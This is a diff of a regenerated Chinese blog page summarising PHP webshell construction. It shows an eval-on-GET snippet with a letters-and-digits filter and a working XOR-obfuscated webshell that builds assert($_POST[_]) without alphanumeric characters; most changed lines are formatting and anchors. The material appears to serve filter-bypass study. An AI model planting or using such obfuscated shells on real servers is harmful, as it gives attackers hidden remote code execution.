@@ -81,19 +81,19 @@
 
 
 
-<meta name="description" content="ASCII表复习 由于构造shell的时候都需要使用到异或等运算，所以手边一定要常备ASCII码表  表格总共是16行8列 从0开始，到0x7f结束 记住常用的ASCII码值 123450 十进制 48 十六进制 0x301 十进制 49 十六进制 0x31A 十进制 65 十六进制 0x41  其实就是跨了16行正好在相邻的列上a 十进制 97 十六进制 0x61  垮了两次16行 最基本的无字">
+<meta name="description" content="ASCII表复习由于构造shell的时候都需要使用到异或等运算，所以手边一定要常备ASCII码表  表格总共是16行8列 从0开始，到0x7f结束 记住常用的ASCII码值 123450 十进制 48 十六进制 0x301 十进制 49 十六进制 0x31A 十进制 65 十六进制 0x41  其实就是跨了16行正好在相邻的列上a 十进制 97 十六进制 0x61  垮了两次16行 最基本的无字母">
 <meta name="keywords" content="php,webshell">
 <meta property="og:type" content="article">
 <meta property="og:title" content="php一些webshell构造总结">
 <meta property="og:url" content="https://prontosil.club/2019/10/05/php-yi-xie-webshell-gou-zao-zong-jie/index.html">
 <meta property="og:site_name" content="prontosil">
-<meta property="og:description" content="ASCII表复习 由于构造shell的时候都需要使用到异或等运算，所以手边一定要常备ASCII码表  表格总共是16行8列 从0开始，到0x7f结束 记住常用的ASCII码值 123450 十进制 48 十六进制 0x301 十进制 49 十六进制 0x31A 十进制 65 十六进制 0x41  其实就是跨了16行正好在相邻的列上a 十进制 97 十六进制 0x61  垮了两次16行 最基本的无字">
+<meta property="og:description" content="ASCII表复习由于构造shell的时候都需要使用到异或等运算，所以手边一定要常备ASCII码表  表格总共是16行8列 从0开始，到0x7f结束 记住常用的ASCII码值 123450 十进制 48 十六进制 0x301 十进制 49 十六进制 0x31A 十进制 65 十六进制 0x41  其实就是跨了16行正好在相邻的列上a 十进制 97 十六进制 0x61  垮了两次16行 最基本的无字母">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://prontosil.club/2019/10/05/php-yi-xie-webshell-gou-zao-zong-jie/ascii">
 <meta property="og:updated_time" content="2019-10-10T13:21:31.941Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="php一些webshell构造总结">
-<meta name="twitter:description" content="ASCII表复习 由于构造shell的时候都需要使用到异或等运算，所以手边一定要常备ASCII码表  表格总共是16行8列 从0开始，到0x7f结束 记住常用的ASCII码值 123450 十进制 48 十六进制 0x301 十进制 49 十六进制 0x31A 十进制 65 十六进制 0x41  其实就是跨了16行正好在相邻的列上a 十进制 97 十六进制 0x61  垮了两次16行 最基本的无字">
+<meta name="twitter:description" content="ASCII表复习由于构造shell的时候都需要使用到异或等运算，所以手边一定要常备ASCII码表  表格总共是16行8列 从0开始，到0x7f结束 记住常用的ASCII码值 123450 十进制 48 十六进制 0x301 十进制 49 十六进制 0x31A 十进制 65 十六进制 0x41  其实就是跨了16行正好在相邻的列上a 十进制 97 十六进制 0x61  垮了两次16行 最基本的无字母">
 <meta name="twitter:image" content="https://prontosil.club/2019/10/05/php-yi-xie-webshell-gou-zao-zong-jie/ascii">
 
 
@@ -401,7 +401,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  195
+                  193
                 </span>
               
 
@@ -438,19 +438,15 @@
       
 
       
-        <h2>ASCII表复习</h2>
-<p>由于构造shell的时候都需要使用到异或等运算，所以手边一定要常备ASCII码表</p>
+        <h2 id="ASCII表复习"><a href="#ASCII表复习" class="headerlink" title="ASCII表复习"></a>ASCII表复习</h2><p>由于构造shell的时候都需要使用到异或等运算，所以手边一定要常备ASCII码表</p>
 <p><img src="/2019/10/05/php-yi-xie-webshell-gou-zao-zong-jie/ascii" alt="img"></p>
 <p>表格总共是16行8列 从0开始，到0x7f结束</p>
 <p>记住常用的ASCII码值</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0 十进制 48 十六进制 0x30</span><br><span class="line">1 十进制 49 十六进制 0x31</span><br><span class="line"></span><br><span class="line">A 十进制 65 十六进制 0x41  其实就是跨了16行正好在相邻的列上</span><br><span class="line">a 十进制 97 十六进制 0x61  垮了两次16行</span><br></pre></td></tr></table></figure></p>
-<h2>最基本的无字母数字webshell</h2>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9]/is'</span>,$_GET[<span class="string">'shell'</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">'shell'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0 十进制 48 十六进制 0x30</span><br><span class="line">1 十进制 49 十六进制 0x31</span><br><span class="line"></span><br><span class="line">A 十进制 65 十六进制 0x41  其实就是跨了16行正好在相邻的列上</span><br><span class="line">a 十进制 97 十六进制 0x61  垮了两次16行</span><br></pre></td></tr></table></figure>
+<h2 id="最基本的无字母数字webshell"><a href="#最基本的无字母数字webshell" class="headerlink" title="最基本的无字母数字webshell"></a>最基本的无字母数字webshell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9]/is'</span>,$_GET[<span class="string">'shell'</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">'shell'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>参考<a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html" target="_blank" rel="noopener">p牛的文章</a></p>
-<h3>通过异或</h3>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=(<span class="string">'%01'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%05'</span>^<span class="string">'`'</span>).(<span class="string">'%12'</span>^<span class="string">'`'</span>).(<span class="string">'%14'</span>^<span class="string">'`'</span>); <span class="comment">// $_='assert';</span></span><br><span class="line">$__=<span class="string">'_'</span>.(<span class="string">'%0D'</span>^<span class="string">']'</span>).(<span class="string">'%2F'</span>^<span class="string">'`'</span>).(<span class="string">'%0E'</span>^<span class="string">']'</span>).(<span class="string">'%09'</span>^<span class="string">']'</span>); <span class="comment">// $__='_POST';</span></span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure></p>
-<h2>取反</h2>
-<p>核心也是构造出一个函数</p>
+<h3 id="通过异或"><a href="#通过异或" class="headerlink" title="通过异或"></a>通过异或</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=(<span class="string">'%01'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%05'</span>^<span class="string">'`'</span>).(<span class="string">'%12'</span>^<span class="string">'`'</span>).(<span class="string">'%14'</span>^<span class="string">'`'</span>); <span class="comment">// $_='assert';</span></span><br><span class="line">$__=<span class="string">'_'</span>.(<span class="string">'%0D'</span>^<span class="string">']'</span>).(<span class="string">'%2F'</span>^<span class="string">'`'</span>).(<span class="string">'%0E'</span>^<span class="string">']'</span>).(<span class="string">'%09'</span>^<span class="string">']'</span>); <span class="comment">// $__='_POST';</span></span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure>
+<h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><p>核心也是构造出一个函数</p>
 
       
     </div>
@@ -685,7 +681,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">ASCII表复习</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">2.</span> <span class="nav-text">最基本的无字母数字webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">2.1.</span> <span class="nav-text">通过异或</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">3.</span> <span class="nav-text">取反</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ASCII表复习"><span class="nav-number">1.</span> <span class="nav-text">ASCII表复习</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#最基本的无字母数字webshell"><span class="nav-number">2.</span> <span class="nav-text">最基本的无字母数字webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通过异或"><span class="nav-number">2.1.</span> <span class="nav-text">通过异或</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#取反"><span class="nav-number">3.</span> <span class="nav-text">取反</span></a></li></ol></div>
             
 
           </div>
